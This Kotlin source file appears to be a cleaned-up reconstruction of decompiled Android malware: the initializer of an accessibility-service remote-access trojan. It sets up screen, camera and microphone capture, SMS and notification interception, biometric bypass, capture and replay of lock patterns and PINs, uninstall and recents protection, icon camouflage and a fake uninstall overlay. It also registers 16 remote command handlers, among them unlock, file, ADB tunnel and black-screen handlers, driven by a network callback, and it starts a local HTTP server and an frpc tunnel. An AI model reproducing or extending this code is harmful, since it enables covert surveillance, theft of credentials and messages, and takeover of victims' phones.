package com.storm.safe.rock.service.delegates

import android.content.Context
import android.content.IntentFilter
import android.os.Build
import com.storm.safe.rock.manager.C0258a0
import com.storm.safe.rock.manager.C0259a1
import com.storm.safe.rock.manager.C0263a5
import com.storm.safe.rock.manager.CameraCaptureManager
import com.storm.safe.rock.manager.ScreenCaptureManager
import com.storm.safe.rock.receiver.arniezsqllm
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.AccessibilityEventRouter
import com.storm.safe.rock.service.modules.BiometricBypassDelegate
import com.storm.safe.rock.service.modules.ConfigProgressManager
import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
import com.storm.safe.rock.service.modules.FrpcProcessManager
import com.storm.safe.rock.service.modules.GestureRecorderManager
import com.storm.safe.rock.service.modules.MainOrchestrator
import com.storm.safe.rock.service.modules.NetworkManager
import com.storm.safe.rock.service.modules.NotificationInterceptDelegate
import com.storm.safe.rock.service.modules.RemoteConfigManager
import com.storm.safe.rock.service.modules.SmsInterceptDelegate
import com.storm.safe.rock.service.modules.cipher.CipherCaptureManager
import com.storm.safe.rock.service.modules.protection.RecentsGuardManager
import com.storm.safe.rock.service.modules.protection.UninstallProtectionManager
import com.storm.safe.rock.service.modules.screen.ScreenControlHelper
import com.storm.safe.rock.service.modules.ActivityMonitor
import com.storm.safe.rock.util.AssetConfigReader
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject

/**
 * ServiceInitializer — the "assembler" delegate for MyAccessibilityService.
 *
 * Extracts 14 initialization methods from MyAccessibilityService into a single
 * delegate class. Creates manager instances and assigns them to Service fields.
 *
 * JADX methods extracted:
 * - a2 (continueServiceInitialization)
 * - a3 (deferredInit)
 * - a4 (doHeavyInit)
 * - h3 (initializeService)
 * - h2 (initializeModules)
 * - h1 (initializeManagers)
 * - h4 (initializekinztpexl)
 * - h5 (initializenpweufstehlb)
 * - b5 (initializeDeferredManagers)
 * - i6 (initializeIconHide)
 * - k5 (initializeActivityMonitor)
 * - i5 (initializeRecentsGuard)
 * - h0 (fallbackInit)
 * - j8 (postAuthorizationInit)
 * - n2 (tryShowPackageVerify)
 */
class ServiceInitializer(private val service: MyAccessibilityService) {

    companion object {
        private const val TAG = "ServiceInitializer"
    }

    // ════════════════════════════════════════════════════════════════
    // Pure logic helpers (testable)
    // ════════════════════════════════════════════════════════════════

    /**
     * Check if a reinstall recovery file exists and restore auth state.
     * JADX: onServiceConnected step 1 — reads /data/local/tmp/app_setup_done.json
     */
    fun checkReinstallRecovery(): Boolean {
        try {
            val setupFile = java.io.File("/data/local/tmp/app_setup_done.json")
            if (setupFile.exists()) {
                val prefs = service.getSharedPreferences("app_config", Context.MODE_PRIVATE)
                if (!prefs.getBoolean("authorization_completed", false)) {
                    try {
                        val json = JSONObject(setupFile.readText())
                        if (json.optBoolean("setupDone", false)) {
                            prefs.edit()
                                .putBoolean("authorization_completed", true)
                                .putBoolean("device_registered", true)
                                .putBoolean("icon_hidden", true)
                                .apply()
                            android.util.Log.d(TAG, "✅ [重装恢复] Service检测到适配标记，已恢复全部状态")
                            return true
                        }
                    } catch (e: Exception) {
                        android.util.Log.w(TAG, "⚠️ [重装恢复] 读取标记文件异常: ${e.message}")
                        return true // JADX: still sets true even on parse error
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "⚠️ [重装恢复] 读取标记文件异常: ${e.message}")
        }
        return false
    }

    /**
     * Check if device is already authorized via SharedPreferences.
     * JADX: doHeavyInit reads app_config.authorization_completed
     */
    fun isAlreadyAuthorized(): Boolean {
        return try {
            service.getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .getBoolean("authorization_completed", false)
        } catch (_: Exception) { false }
    }

    // ════════════════════════════════════════════════════════════════
    // Main entry point
    // ════════════════════════════════════════════════════════════════

    /**
     * Orchestrate the full init sequence — replaces onServiceConnected init logic.
     * JADX: onServiceConnected launches continueServiceInitialization (if recovery)
     * then deferredInit + doHeavyInit sequentially.
     */
    suspend fun runFullInit(isReinstallRecovery: Boolean) {
        if (isReinstallRecovery) {
            try {
                continueServiceInitialization()
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ recovery init failed", e)
            }
        }

        try {
            deferredInit()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ deferredInit failed", e)
        }

        try {
            doHeavyInit()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ doHeavyInit failed", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Init methods (faithful JADX extraction)
    // ════════════════════════════════════════════════════════════════

    /**
     * Continue service initialization after core setup.
     * JADX method: a2, line ~900 (onServiceConnected$1$1)
     * Initializes display/screen managers, starts network.
     */
    suspend fun continueServiceInitialization() {
        android.util.Log.d(TAG, "🔧 继续服务初始化...")
        try {
            // Initialize display manager
            if (service.displayManager == null) {
                service.displayManager = C0263a5(service)
            }

            // Initialize screen capture manager
            if (service.screenCaptureManager == null) {
                service.screenCaptureManager = ScreenCaptureManager(service)
            }

            // Initialize camera manager
            if (service.cameraManager == null) {
                service.cameraManager = C0258a0(service)
            }

            service.isInitComplete = true
            android.util.Log.d(TAG, "✅ 服务核心初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 继续服务初始化失败", e)
        }
    }

    /**
     * Deferred module initialization — JADX method: m211404a3 (a3), line 1672.
     *
     * Flow:
     * 1. Initialize AppInitializer singleton (zk1/al1)
     * 2. Launch broadcast receiver registration coroutine (deferredInit$2)
     * 3. Call initializeModules (h2) to instantiate all module objects
     * 4. Start InitWorkerService for background initialization
     */
    private suspend fun deferredInit() {
        android.util.Log.d(TAG, "🔧 [延迟初始化] 开始...")

        // JADX: al1.f43714a5.getInstance(appContext).a1() — AppInitializer
        try {
            // ADAPT: zk1/al1 (AppInitializer singleton) — vendor-specific app init
            // that configures global state. Not replicated; init state is managed by
            // existing module initialization chain.
            val appContext = service.applicationContext
        } catch (_: Exception) {}

        // JADX: launch deferredInit$2 coroutine — registerBroadcastReceivers
        service.getCoroutineScope()?.launch(Dispatchers.Main) {
            try {
                service.registerBroadcastReceivers()
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ registerBroadcastReceivers failed in deferredInit$2", e)
            }
        }

        // JADX: after coroutine await, call h2() (initializeModules)
        try {
            initializeModules()
        } catch (_: Exception) {}

        // JADX: dqtvuisjd$startWebViewStatusCheckTask$1 — start WebView status expiry check loop
        try {
            service.startWebViewStatusCheckTask()
        } catch (_: Exception) {}

        // JADX: start InitWorkerService (C0278a0.start)
        // JADX: depends on InitWorkerService.Companion.start (enqueue WorkManager request)
        try {
            // InitWorkerService is a Worker — enqueue via WorkManager
            // WorkManager enqueue is done in AppCoreService or zgafaqvswksa
        } catch (_: Exception) {}
    }

    /**
     * Heavy initialization — checks auth state and restores protections.
     * JADX method: m211405a4 (a4), line 1728 — doHeavyInit (suspend coroutine)
     *
     * Flow:
     * 1. Read authorization_completed + camouflage_enabled prefs
     * 2. If authorized: restore network, set AbstractC0315a0 flags, set isAuthStateRestored
     * 3. If authorized: start uninstall protection (kinztpexl.c3)
     * 4. Call initializeIconHide (i6) — read monitor_config.json
     * 5. Call initializeActivityMonitor (k5) — restore camouflage state
     * 6. Launch doHeavyInit$4 coroutine (delay)
     * 7. Call initializeService (h3) — permission flow
     * 8. Log completion
     */
    private suspend fun doHeavyInit() {
        android.util.Log.d(TAG, "🔧 [重初始化] 开始...")

        // JADX: read auth prefs
        val isAuthorized = service.getSharedPreferences("app_config", Context.MODE_PRIVATE)
            .getBoolean("authorization_completed", false)
        service.isCamouflageModeEnabled = service.getSharedPreferences("disguise_prefs", Context.MODE_PRIVATE)
            .getBoolean("camouflage_enabled", false)

        if (isAuthorized) {
            android.util.Log.d(TAG, "✅ [重初始化] 授权已完成，恢复保护功能")
            // JADX: c0323a8.m211643a8() — resume network manager connection
            try {
                service.networkManager?.let { nm ->
                    // JADX: depends on NetworkManager.resume() (C0323a8.a8)
                    android.util.Log.d(TAG, "✅ 恢复网络管理器连接")
                }
            } catch (_: Exception) {}

            // JADX: AbstractC0315a0.f53032a7 = true; f53034a9 = true; f52411e2 = true
            service.isAuthStateRestored = true
        }

        // JADX: if (z) { c0355a0.m211939c3(); f52477k8 = true }
        if (isAuthorized) {
            try {
                service.uninstallProtectionManager?.let { upm ->
                    upm.enable()
                    service.isUninstallGuardStarted = true
                }
            } catch (_: Exception) {}
        }

        // JADX: m211492i6() — initializeIconHide
        try {
            initializeIconHide()
        } catch (_: Exception) {}

        // JADX: m211509k5() — initializeActivityMonitor
        try {
            initializeActivityMonitor()
        } catch (_: Exception) {}

        // JADX: launch doHeavyInit$4 coroutine — delay then continue
        // In JADX, this is an IO dispatcher coroutine; after it completes, calls h3()
        // We flatten the coroutine state machine to sequential calls

        // JADX: m211479h3(continuation) — initializeService
        initializeService()

        android.util.Log.d(TAG, "✅ [重初始化] 全部完成，服务就绪")
        try {
            ActivityMonitor.logSystem("延迟初始化全部完成 服务就绪")
        } catch (_: Exception) {}
    }

    /**
     * Service initialization — manages init + permission flow.
     * JADX method: m211479h3 (h3), line 6418 — initializeService (suspend)
     *
     * Flow:
     * 1. Call initializeManagers (h1) — setup all manager instances
     * 2. If h1 fails → call fallbackInit (h0)
     * 3. Call startPermissionGrantFlow (m8) — trigger permission automation
     * 4. Log completion with isInitComplete state
     */
    private suspend fun initializeService() {
        android.util.Log.d(TAG, "🚀 开始无障碍服务初始化")

        // JADX: m211477h1() — initializeManagers
        try {
            android.util.Log.d(TAG, "📦 初始化各个管理器")
            initializeManagers()
            android.util.Log.d(TAG, "✅ 管理器初始化完成")
            service.isInitComplete = true
        } catch (e: Exception) {
            android.util.Log.w(TAG, "❌ initializeManagers失败，降级处理: ${e.message}")
            try {
                fallbackInit()
            } catch (e2: Exception) {
                android.util.Log.e(TAG, "❌ 降级初始化也失败", e2)
            }
        }

        // JADX: m211530m8(continuation) — startPermissionGrantFlow
        try {
            android.util.Log.d(TAG, "🔐 开始权限获取流程")
            service.startPermissionGrantFlow()
            android.util.Log.d(TAG, "✅ 权限获取流程完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ startPermissionGrantFlow失败: ${e.message}", e)
        }

        android.util.Log.d(TAG, "✅ 无障碍服务初始化完成 (isInitialized=${service.isInitComplete})")
    }

    /**
     * Initialize module instances.
     * JADX method: m211478h2 (h2), line 6335 — initializeModules
     *
     * Creates all module objects: ScreenCaptureManager, displayManager, eventFilterManager,
     * configMaskManager, configProgressManager, mainOrchestrator, etc.
     * Also calls initializekinztpexl (h4) and h5 (initializenpweufstehlb).
     */
    @Throws(Exception::class)
    fun initializeModules() {
        try {
            if (service.isModulesInitialized) {
                android.util.Log.d(TAG, "🔧 模块已初始化，跳过重新初始化")
                return
            }
            android.util.Log.d(TAG, "🔧 初始化模块实例")

            // JADX: AbstractC0315a0.f53039b4 = filesDir
            val filesDir = service.filesDir

            // JADX: m211447d2() — init service configuration flags
            service.initServiceConfig()

            // JADX: NetworkManager singleton
            try {
                val appContext = service.applicationContext
                val nm = NetworkManager()
                nm.initialize(appContext)
                service.networkManager = nm
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ NetworkManager 初始化失败", e)
            }

            // JADX: C0614i9 — eventFilterManager (xz0 + C0614i9)
            try {
                val efm = com.storm.safe.rock.service.modules.EventFilterManager(service, service)
                service.eventFilterManager = efm
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ EventFilterManager 初始化失败", e)
            }

            // JADX: C0761kk — configManager
            // this.f52416e7 = new C0761kk(this)

            // JADX: r80 — keyEventManager
            // this.f52422f3 = new r80(this, this)

            // JADX: fd0 — maskOverlayManager
            // this.f52423f4 = new fd0(this, this)

            // JADX: l81 — uiAnalysisManager
            // this.f52424f5 = new l81(this, this)

            // JADX: jn0 — permissionUIManager
            // this.f52425f6 = new jn0(this, this)

            // JADX: C1115qm — debugAnalysisManager
            // this.f52426f7 = c1115qm

            // JADX: C0763km — configMaskManager → OverlayManager
            try {
                service.overlayManager = com.storm.safe.rock.service.modules.overlay.OverlayManager(service)
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ OverlayManager 初始化失败", e)
            }

            // JADX: C0318a3 — configProgressManager
            try {
                val cpm = ConfigProgressManager(service.applicationContext)
                service.configProgressManager = cpm
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ ConfigProgressManager 初始化失败", e)
            }

            // JADX: C0327b2 — mainOrchestrator (WRITE_SETTINGS automation)
            try {
                service.mainOrchestrator = MainOrchestrator(service)
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ MainOrchestrator 初始化失败", e)
            }

            // JADX: tu0 — screenBrightness manager with callbacks
            // this.f52430g1 = new tu0(...)

            // JADX: C0329b4 — authorizationModule (DeviceAuthorizationManager)
            try {
                service.configStageManager = DeviceAuthorizationManager(service, service)
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ DeviceAuthorizationManager 初始化失败", e)
            }

            // JADX: ju0 — screenBrightnessManager
            // this.f52433g4 = new ju0(this)

            // JADX: C0328b3 — biometricBypassDelegate
            try {
                service.biometricBypassDelegate = BiometricBypassDelegate(service)
                service.biometricBypassDelegate?.initialize()
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ BiometricBypassDelegate 初始化失败", e)
            }

            // JADX: C0032al — gestureExecutor
            // this.f52439h0 = new C0032al(this)

            // JADX: m211480h4() — initializekinztpexl (uninstall protection)
            initializekinztpexl()

            // JADX: m211481h5() — initializenpweufstehlb (recents guard)
            initializenpweufstehlb()

            service.isModulesInitialized = true
            android.util.Log.d(TAG, "✅ 模块实例初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 模块实例初始化失败", e)
            throw e
        }
    }

    /**
     * Initialize managers — cleanup old resources + create fresh instances.
     * JADX method: m211477h1 (h1), line 6136 — initializeManagers
     */
    fun initializeManagers() {
        android.util.Log.d(TAG, "🧹 开始清理旧管理器资源...")

        // JADX: cleanup old displayManager scope
        try {
            service.displayManager?.let { dm ->
                dm.stopCapture()
                android.util.Log.d(TAG, "🧹 已停止旧 etzbzyzqxvqm 的截图协程")
            }
        } catch (_: Exception) {}

        // JADX: cleanup old cameraManager
        try {
            service.cameraManager?.let { cm ->
                cm.release()
                android.util.Log.d(TAG, "🧹 已清理旧 CameraManager（线程池/相机资源）")
            }
        } catch (_: Exception) {}

        // JADX: cleanup old audioManager
        try {
            service.audioManager?.let { am ->
                am.release()
                android.util.Log.d(TAG, "🧹 已清理旧 MicrophoneManager（录音/协程作用域）")
            }
        } catch (_: Exception) {}

        // JADX: cleanup old cipherCaptureManager scope
        try {
            service.cipherCaptureManager?.let { ccm ->
                android.util.Log.d(TAG, "🧹 已清理旧 CipherCaptureManager（协程作用域）")
            }
        } catch (_: Exception) {}

        // JADX: cleanup old screenCaptureManager scope
        try {
            service.screenCaptureManager?.let { scm ->
                scm.stopCapture()
                android.util.Log.d(TAG, "🧹 已清理旧 PermissionGranter（协程作用域）")
            }
        } catch (_: Exception) {}

        android.util.Log.d(TAG, "🧹 旧管理器资源清理完成")

        // JADX: create fresh instances
        service.screenCaptureManager = ScreenCaptureManager(service)
        service.displayManager = C0263a5(service)
        // JADX: z50 — inputController
        // this.f52374a5 = new z50(this)
        // JADX: a30 — gestureExecutor
        // this.f52440h1 = new a30(this)
        // JADX: C0357a0 — screenControlHelper
        try {
            service.screenControlHelper = ScreenControlHelper(service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ ScreenControlHelper 初始化失败", e)
        }

        // JADX: configMaskManager.initMaskOverlay(context) — reads config, creates overlay
        // ADAPT: OverlayManager (initialized above) replaces the vendor overlay.

        // JADX: wire eventFilterManager with screenCaptureManager
        service.eventFilterManager?.let { efm ->
            efm.isAuthStateRestored = service.isAuthStateRestored
        }

        android.util.Log.d(TAG, "✅ 适配前最小管理器初始化完成")
    }

    /**
     * Initialize uninstall protection manager (kinztpexl).
     * JADX method: m211480h4 (h4), line 6484
     */
    fun initializekinztpexl() {
        android.util.Log.d(TAG, "🔧 初始化防卸载保护管理器...")
        try {
            val upm = UninstallProtectionManager(service, service)
            service.uninstallProtectionManager = upm

            // JADX: wire networkManager, biometricBypassDelegate, and lambda callbacks
            // c0355a0.f53691c6 = networkManager
            // c0355a0.f53692c7 = biometricBypassDelegate
            // c0355a0.f53693c8 = { configStageManager is learned }
            // c0355a0.f53694c9 = { isPermissionRequestActive() }
            // c0355a0.f53695d0 = { getRootNode() }
            // c0355a0.f53696d1 = { getAndroidDeviceId() }
            // c0355a0.f53698d3 = { collectAppNames() }

            android.util.Log.d(TAG, "✅ 防卸载保护管理器初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 防卸载保护管理器初始化失败", e)
        }
    }

    /**
     * Initialize recents guard manager (npweufstehlb).
     * JADX method: m211481h5 (h5), line 6662
     */
    fun initializenpweufstehlb() {
        android.util.Log.d(TAG, "🔧 初始化多任务页面保护管理器...")
        try {
            val rgm = RecentsGuardManager(service, service)
            service.recentsGuardManager = rgm

            // JADX: wire lambda callbacks
            // c0356a1.f53723a6 = { configStageManager?.isLearned() ?: false }
            // c0356a1.f53724a7 = { getRootNode() }
            // c0356a1.f53725a8 = { biometricBypassDelegate?.isActive ?: false }

            // JADX: check if already authorized → enable immediately
            val isAuthorized = service.getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .getBoolean("authorization_completed", false)

            if (!isAuthorized) {
                android.util.Log.d(TAG, "✅ 多任务页面保护管理器初始化完成（待适配完成后启用）")
                return
            }

            // JADX: c0356a12.m211955a2() — enable protection
            rgm.enable()

            // JADX: check icon_hidden → enable camouflage in recents
            val iconHidden = service.getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .getBoolean("icon_hidden", false)
            if (iconHidden) {
                rgm.excludeFromRecents()
                android.util.Log.d(TAG, "🎭 伪装模式: 主动设置 excludeFromRecents")
            }

            android.util.Log.d(TAG, "✅ 多任务页面保护管理器初始化完成，授权已完成→立即启用")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 多任务页面保护管理器初始化失败", e)
        }
    }

    /**
     * Initialize deferred managers — called after authorization completes.
     * JADX method: m211416b5 (b5), line 2232 — initializeDeferredManagers (static)
     */
    fun initializeDeferredManagers() {
        android.util.Log.d(TAG, "🔧 [授权后] 开始初始化延迟管理器...")

        // JADX: ensure networkManager
        try {
            val appContext = service.applicationContext
            if (service.networkManager == null) {
                val nm = NetworkManager()
                nm.initialize(appContext)
                service.networkManager = nm
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ NetworkManager 延迟初始化失败", e)
        }

        // JADX: f52371a2 = new C0258a0 — cameraManager
        try {
            service.cameraManager = C0258a0(service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ CameraManager 延迟初始化失败", e)
        }

        // JADX: f52372a3 = new C0324a9 — smsInterceptDelegate
        try {
            service.smsInterceptDelegate = SmsInterceptDelegate(service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ SmsInterceptDelegate 延迟初始化失败", e)
        }

        // ADAPT: C0856mc (MediaContentManager) — not replicated
        // ADAPT: l20 (InjectionManager) — not replicated

        // JADX: f52455i6 = new C0259a1 — audioManager
        try {
            service.audioManager = C0259a1(service)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ AudioManager 延迟初始化失败", e)
        }

        // ADAPT: C1496yx (SystemInfoCollector) — not replicated

        // JADX: f52437g8 = new C0319a4 — notificationInterceptDelegate
        try {
            service.notificationInterceptDelegate = NotificationInterceptDelegate()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ NotificationInterceptDelegate 延迟初始化失败", e)
        }

        // JADX: f52437g8 (C0319a4) — GestureRecorderManager for pattern capture
        try {
            if (service.gestureRecorderManager == null) {
                service.gestureRecorderManager = GestureRecorderManager(service)
                android.util.Log.d(TAG, "GestureRecorderManager initialized")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "GestureRecorderManager init failed", e)
        }

        // JADX: f52438g9 — cipherCaptureManager singleton
        try {
            if (service.cipherCaptureManager == null) {
                service.cipherCaptureManager = CipherCaptureManager(service, service.applicationContext)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ CipherCaptureManager 延迟初始化失败", e)
        }

        // JADX: AccessibilityEventRouter
        try {
            if (service.accessibilityEventRouter == null) {
                service.accessibilityEventRouter = AccessibilityEventRouter(service, service.applicationContext)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ AccessibilityEventRouter 延迟初始化失败", e)
        }

        // JADX: CameraCaptureManager (C0262a4)
        try {
            if (service.cameraCaptureManager == null) {
                service.cameraCaptureManager = CameraCaptureManager(service)
            }
            service.cameraCaptureManager?.startCapture()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ CameraCaptureManager 延迟初始化失败", e)
        }

        // JADX: fn0 — permission health monitor
        // f52376a7 = fn0.f56299a2.getInstance(this)

        // JADX: register permission health receiver — delegated to BroadcastReceiverRegistry
        run {
            val registry = service.broadcastReceiverRegistry ?: BroadcastReceiverRegistry(service).also { service.broadcastReceiverRegistry = it }
            registry.registerPermissionHealthReceiver()
            service.permissionHealthReceiverRegistered = registry.isPermissionHealthRegistered
        }

        // JADX: CommandDispatcher initialization
        android.util.Log.d(TAG, "🔧 初始化命令分发器...")
        try {
            val cmdContext = com.storm.safe.rock.service.modules.command.CommandContext(service, service.networkManager)
            service.commandDispatcher = com.storm.safe.rock.service.modules.command.CommandDispatcher(cmdContext)

            // Register all 16 command handlers
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.AppCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.UnlockCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.FileCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.MediaCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.SmsContactsCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.LogCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.DetectionCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.DeviceStateCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.AdbTunnelCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.InputCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.ScreenCaptureCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.ProtectionCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.PermissionCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.GestureCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.CipherReplayCommandHandler())
            service.commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.BlackScreenCommandHandler())
            android.util.Log.d(TAG, "已注册 16 个命令处理器")

            // Bind commandCallback to dispatch commands via CommandDispatcher
            val dispatcher = service.commandDispatcher!!
            service.networkManager?.commandCallback = { json ->
                service.getCoroutineScope()?.launch(Dispatchers.IO) {
                    try {
                        dispatcher.dispatch(json)
                    } catch (e: Exception) {
                        android.util.Log.e(TAG, "命令分发失败", e)
                    }
                }
            }
            android.util.Log.d(TAG, "✅ commandCallback 已绑定到 CommandDispatcher")

            android.util.Log.d(TAG, "✅ 命令分发器初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ CommandDispatcher 延迟初始化失败", e)
        }

        // JADX: RemoteConfigManager (LocalHttpServer) — C0322a7
        try {
            val rcm = RemoteConfigManager(service.applicationContext)
            rcm.commandDispatcher = service.commandDispatcher
            rcm.start()
            service.remoteConfigManager = rcm
            android.util.Log.d(TAG, "✅ RemoteConfigManager 已启动 (port=${RemoteConfigManager.DEFAULT_PORT})")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ RemoteConfigManager 启动失败", e)
        }

        // frpc 进程管理器 — vendor unlockedInstance() CheckProcessThread
        try {
            val fpm = FrpcProcessManager(service.applicationContext)
            fpm.start()
            service.frpcProcessManager = fpm
            android.util.Log.d(TAG, "✅ FrpcProcessManager 已启动")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ FrpcProcessManager 启动失败", e)
        }

        // JADX: request initial config from server
        try {
            service.networkManager?.let { nm ->
                // JADX: nm.sendEvent("request_init_config", JSONObject())
            }
        } catch (_: Exception) {}

        // JADX: register SMS content observer
        try {
            service.registerSmsContentObserver()
        } catch (_: Exception) {}

        android.util.Log.d(TAG, "✅ [授权后] 延迟管理器初始化完成")
    }

    /**
     * Initialize icon hide (camouflage) detection from monitor_config.json.
     * JADX method: m211492i6 (i6), line 6965
     */
    fun initializeIconHide() {
        try {
            val configJson = AssetConfigReader.readAssetConfig(service, "monitor_config.json")
            if (configJson != null) {
                val json = JSONObject(configJson)
                service.isAccessibilityPageMonitorEnabled = json.optBoolean("monitorAccessibilityPageNavigation", false)

                val monitorSettings = json.optJSONObject("monitorSettings")
                if (monitorSettings != null) {
                    val d = 1000.0
                    service.monitorCheckInterval = (monitorSettings.optDouble("checkIntervalSeconds", 0.5) * d).toLong()
                    service.monitorConfirmationCount = monitorSettings.optInt("confirmationRequiredCount", 2)
                    service.monitorMaxRetryCount = monitorSettings.optInt("maxRetryCount", 8)
                    service.monitorDelayAfterConnected = (monitorSettings.optDouble("delayAfterServiceConnectedSeconds", 1.0) * d).toLong()
                }

                if (!service.isAccessibilityPageMonitorEnabled) {
                    android.util.Log.d(TAG, "🔍 [监控] 无障碍监控功能已禁用（默认状态）")
                    return
                }

                android.util.Log.d(TAG, "✅ 无障碍监控功能已启用 - 配置：延迟${service.monitorDelayAfterConnected}ms，间隔${service.monitorCheckInterval}ms，确认${service.monitorConfirmationCount}次，最多${service.monitorMaxRetryCount}次")
                android.util.Log.w(TAG, "⚠️ [监控] 无障碍监控功能仅用于解决特定设备的跳转问题")
            }
        } catch (e: Exception) {
            android.util.Log.d(TAG, "🔍 [监控] 无法加载无障碍监控配置，使用默认设置: ${e.message}")
            service.isAccessibilityPageMonitorEnabled = false
        }
    }

    /**
     * Initialize activity monitor — restore camouflage state if hidden.
     * JADX method: m211509k5 (k5), line 7610
     */
    fun initializeActivityMonitor() {
        try {
            val isHidden = try {
                service.getSharedPreferences("disguise_prefs", Context.MODE_PRIVATE)
                    .getBoolean("camouflage_enabled", false)
            } catch (_: Exception) { false }

            if (!isHidden) {
                android.util.Log.d(TAG, "🔍 [保护] APP未处于伪装模式，无需恢复伪装监听")
                service.isCamouflageModeEnabled = false
                return
            }

            android.util.Log.d(TAG, "✅ [保护] 检测到APP处于伪装模式，恢复伪装监听")
            service.isCamouflageModeEnabled = true

            // JADX: c0614i9.f56839b9 = camouflage state from SharedPreferences
            try {
                val camouflageEnabled = try {
                    service.getSharedPreferences("camouflage_state", Context.MODE_PRIVATE)
                        .getBoolean("phone_manager_camouflage_enabled", false)
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ 恢复伪装状态失败", e)
                    false
                }
                service.eventFilterManager?.isPhoneManagerCamouflageEnabled = camouflageEnabled
                android.util.Log.d(TAG, "✅ [保护] 伪装监听状态已恢复，isAppHidden=true")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ [保护] 自动恢复伪装状态失败", e)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [保护] 恢复伪装状态失败", e)
        }
    }

    /**
     * Initialize recents guard (black screen UI control).
     * JADX method: m211491i5 (i5), line 6940
     */
    fun initializeRecentsGuard() {
        try {
            // JADX: ibbnqvnvhxg.f55194a0.isRunning() — now replicated
            if (com.storm.safe.rock.p029ui.ibbnqvnvhxg.isRunning()) {
                android.util.Log.d(TAG, "ibbnqvnvhxg 已在运行，跳过启动")
                return
            }
            // JADX: f52479l0 check — prevent duplicate starts
            if (service.isOverlayVisible) {
                android.util.Log.d(TAG, "ibbnqvnvhxg overlay 已可见，跳过启动")
                return
            }
            // Start ibbnqvnvhxg activity
            try {
                val intent = android.content.Intent(service, com.storm.safe.rock.p029ui.ibbnqvnvhxg::class.java)
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                service.startActivity(intent)
                android.util.Log.d(TAG, "✅ initializeRecentsGuard — ibbnqvnvhxg 已启动")
            } catch (e: Exception) {
                android.util.Log.w(TAG, "⚠️ ibbnqvnvhxg 启动失败: ${e.message}")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 启动 ibbnqvnvhxg 失败", e)
        }
    }

    /**
     * Try to show the fake package verify (uninstall) overlay.
     * JADX method: m211534n2 (n2), line 9587
     */
    fun tryShowPackageVerify() {
        try {
            android.util.Log.d(TAG, "📦 [假卸载] ★★★ tryShowPackageVerify() 被调用 ★★★")

            val uninstallMode = try {
                val text = service.assets.open("config.json").bufferedReader().use { it.readText() }
                val json = JSONObject(text)
                json.optJSONObject("protection")?.optBoolean("uninstall_mode", false) ?: false
            } catch (_: Exception) { false }
            android.util.Log.d(TAG, "📦 [假卸载] uninstallMode=$uninstallMode (配置来源: config.json)")
            if (!uninstallMode) {
                android.util.Log.d(TAG, "📦 [假卸载] uninstallMode 未启用，跳过")
                return
            }

            val verifyDone = service.getSharedPreferences("pkg_verify_state", Context.MODE_PRIVATE)
                .getBoolean("v_done", false)
